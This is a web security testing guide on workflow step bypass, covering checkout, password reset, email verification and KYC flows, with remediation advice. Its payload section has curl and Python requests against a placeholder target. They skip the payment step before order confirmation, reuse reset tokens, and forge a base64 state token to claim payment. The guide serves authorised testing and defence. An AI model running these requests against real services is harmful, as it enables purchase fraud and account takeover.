# Workflow Step Bypass

## Overview
Multi-step workflows — checkout processes, account registration, password reset flows, order approval chains, KYC/identity verification — are vulnerable when the application enforces step sequence only on the client side or fails to verify that all preceding steps were completed before allowing a later step to execute. An attacker can skip required steps by directly accessing later-stage endpoints, replaying tokens out of order, or manipulating state parameters to jump to the end of a workflow, bypassing verification, payment, or approval steps entirely.

## How It Works
Applications implement multi-step workflows in several ways:

1. **Server-side session state (common, often correct):** Each step sets a flag in the session (`step_1_complete: true`). If step 2 checks that flag, and the server strictly enforces it, skipping is prevented. But many apps only enforce this on some steps.

2. **Client-side state (vulnerable):** Step tracking happens in a hidden form field (`<input type="hidden" name="step" value="2">`), a URL parameter (`/checkout?step=3`), or a cookie. Attacker directly submits step 3's form data or visits `/checkout/confirm` directly.

3. **Token-based flows (often vulnerable):** Each step returns a token used in the next step. If the token doesn't cryptographically bind to the previous step's completion, the attacker can skip to the last step using a fabricated or reused token.

4. **AJAX-driven SPAs:** The frontend enforces step order via JavaScript routing, but the backend API accepts requests out of sequence. The attacker calls `/api/checkout/confirm` directly without having called `/api/checkout/payment`.

5. **Parameter-based step tracking:** `POST /workflow` with body `{"current_step": 2, "next_step": 3}` — attacker changes to `{"current_step": 1, "next_step": 5}`.

Common business impact scenarios:
- **Checkout bypass:** skip the payment step, go straight to order confirmation.
- **Identity verification bypass:** skip KYC/ID upload step in a financial app, gain full account access.
- **Admin approval bypass:** skip pending review state, directly activate a resource.
- **Email verification bypass:** access restricted features without confirming email.
- **Password reset bypass:** skip the "confirm old password" step.

## Impact
- Completing purchases without paying.
- Bypassing identity or age verification in regulated industries.
- Accessing premium features without completing payment.
- Skipping approval chains in enterprise workflows (purchasing, HR, contract management).
- Bypassing email/phone verification for account creation, enabling mass fake account creation.
- Account takeover by skipping password confirmation steps in security-sensitive flows.

## Where to Look
- Multi-page checkout flows (especially step 3/4 of a 4-step process).
- Password reset flows with multiple steps (request → verify code → set new password).
- Registration flows with email/phone verification steps.
- Loan/credit application workflows with document upload steps.
- KYC (Know Your Customer) verification in fintech/crypto apps.
- Order approval or review queues in B2B apps.
- Hidden form fields named `step`, `stage`, `phase`, `current_step`, `workflow_state`.
- URL patterns like `/checkout/step/3`, `/wizard/4`, `/onboarding/complete`.
- State tokens in POST bodies that encode workflow progress.

## Testing Steps
1. Map the complete workflow by completing it legitimately. Note every HTTP request at each step.
2. In Burp Suite, capture all requests from step 1 through the final step.
3. Start a new session and directly attempt to access the final step's URL without completing earlier steps.
4. If the final step requires a token from a previous step, try using an old token from a prior completed workflow.
5. Try submitting the final step's POST body (captured from a previous legitimate completion) directly.
6. Test intermediate step skipping: go from step 1 to step 3, skipping step 2.
7. Modify step indicators in hidden fields, URL params, or cookies: change `step=2` to `step=5`.
8. In multi-window/tab tests: open step 1 in one tab, complete step 1, then directly navigate to step 3's URL in a different tab without completing step 2.
9. Test state manipulation after failure: if step 2 fails validation, try to advance to step 3 anyway.
10. For payment bypass specifically: attempt to access the order confirmation URL before submitting payment.

## Payloads / Techniques

```bash
# ===== DIRECT ENDPOINT ACCESS =====
# Complete step 1 legitimately to get a session, then jump to step 3

# Step 1: Start checkout
curl -s -c /tmp/cookies.txt -X POST https://target.example.com/checkout/start \
  -H "Content-Type: application/json" \
  -d '{"cart_id": "CART-123"}'

# Skip step 2 (payment) and jump directly to step 3 (confirmation)
curl -s -b /tmp/cookies.txt https://target.example.com/checkout/confirm

# Try POST to confirmation endpoint with cart data but no payment
curl -s -b /tmp/cookies.txt -X POST https://target.example.com/checkout/confirm \
  -H "Content-Type: application/json" \
  -d '{"cart_id": "CART-123", "action": "place_order"}'


# ===== HIDDEN FIELD / PARAMETER MANIPULATION =====

# If checkout uses hidden fields for step tracking:
# Modify step parameter directly
curl -s -b /tmp/cookies.txt -X POST https://target.example.com/checkout \
  -d "step=confirm&cart_id=CART-123&items=PROD-001"

# URL parameter bypass
curl -s -b /tmp/cookies.txt \
  "https://target.example.com/checkout?step=confirm&cart_id=CART-123"


# ===== PASSWORD RESET FLOW BYPASS =====
# Step 1: request reset (done legitimately)
# Step 2: verify OTP/token (skip this)
# Step 3: set new password (attempt directly)

# Capture a legitimate reset token from a previous completed flow
# Then use it out of order or from a new session
curl -s -X POST https://target.example.com/password-reset/new-password \
  -H "Content-Type: application/json" \
  -d '{"reset_token": "PREVIOUSLY_OBTAINED_TOKEN", "new_password": "NewPassword1!"}'


# ===== EMAIL VERIFICATION BYPASS =====
# Attempt to access restricted feature before email is verified
# The /dashboard should require verified email but may not check properly

# Register new account
curl -s -c /tmp/cookies2.txt -X POST https://target.example.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"email": "test@attacker.com", "password": "Test1234!"}'

# Skip verification: try accessing restricted dashboard directly
curl -s -b /tmp/cookies2.txt https://target.example.com/api/dashboard

# Try to access premium features
curl -s -b /tmp/cookies2.txt https://target.example.com/api/premium/feature


# ===== WORKFLOW STATE TOKEN MANIPULATION =====
# If workflow uses a state token: e.g., checkout_token = base64({"step":2,"paid":false})
# Modify the token to advance the step
python3 -c "
import base64, json

# Decode the captured state token
state_token = 'eyJzdGVwIjoyLCJwYWlkIjpmYWxzZX0='
decoded = base64.b64decode(state_token).decode()
print('Original state:', decoded)

# Modify the state
state = json.loads(decoded)
state['step'] = 5
state['paid'] = True  # Claim payment is complete
modified = base64.b64encode(json.dumps(state).encode()).decode()
print('Modified token:', modified)
"
# Use the modified token in the next request

# If the state token is signed with HMAC, test for algorithm confusion or weak key
# See: HMAC bypass / JWT attack techniques
```

```python
# Automated workflow step bypass test
import requests

BASE_URL = "https://target.example.com"

# Create a new session by completing step 1
session = requests.Session()

# Step 1: initiate checkout
r1 = session.post(f"{BASE_URL}/api/checkout/init",
                  json={"cart_id": "CART-123"})
print(f"Step 1 (Init): HTTP {r1.status_code}")

# Step 2 SKIPPED — payment submission
# Directly try step 3
r3 = session.post(f"{BASE_URL}/api/checkout/confirm",
                  json={"cart_id": "CART-123"})
print(f"Step 3 (Confirm, skipping payment): HTTP {r3.status_code}")
print("Response:", r3.text[:200])

if r3.status_code in [200, 201]:
    print("[!] POTENTIAL BYPASS: Confirmation accepted without payment step!")
elif "order" in r3.text.lower():
    print("[!] Order-related content in response — investigate further!")
```

## Burp Suite Tips
- Use **Proxy > HTTP History** to map the complete workflow. Note the order of requests, the tokens exchanged, and which endpoints have prerequisite steps.
- Right-click each step's request in History and **Send to Repeater**. Then replay step-N requests without having replayed steps 1 through N-1, using only a fresh session cookie.
- Use **Burp's Session Handling Rules** (`Project Options > Sessions`) to automate session renewal so you can test step-skipping with fresh, clean session state each time.
- The **CSRF Scanner** and **Session Tokens Analyzer** can help identify state tokens passed between steps.
- Use **Target > Site Map** to visualize the complete site structure — you may see later-stage endpoints you haven't visited yet, which are candidates for direct access testing.
- In **Intruder**, test step parameter values numerically (step=1 through step=10) to discover what the application exposes at each step value.
- Check **Proxy > HTTP History > Filter** for requests showing step/stage parameters to quickly identify all step-tracking mechanisms.

## Tools
- Burp Suite (Proxy, Repeater, Intruder, Session Handling Rules)
- curl (manual step-skipping tests)
- Python requests (automated multi-step bypass testing)
- OWASP ZAP (workflow scanning)
- Postman (API workflow testing)
- mitmproxy (transparent proxy for mobile app workflow testing)

## Remediation
- Enforce workflow state strictly on the server side. Store workflow progress in the server-side session, not in client-controlled parameters.
- On each step handler, verify that all preceding steps were completed in the current session before executing the current step's logic.
- Use cryptographically signed, step-bound tokens that encode which step they are valid for and bind to the user's session. Validate step, session binding, and expiry on each step.
- Implement a state machine for complex workflows: define valid transitions between states and reject any transition that skips a state.
- For payment flows: never allow order confirmation to succeed without a completed, verified payment transaction record tied to the order.
- Token reuse: make step tokens single-use and expire them immediately after the next step is reached.
- Log and alert on unusual workflow sequences (direct access to later-stage endpoints without earlier steps in the session's history).

## References
https://portswigger.net/web-security/logic-flaws/examples
https://cheatsheetseries.owasp.org/cheatsheets/Business_Logic_Security_Cheat_Sheet.html
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/10-Business_Logic_Testing/OTG-BUSLOGIC-006
https://owasp.org/www-community/attacks/Forced_browsing
https://cwe.mitre.org/data/definitions/841.html
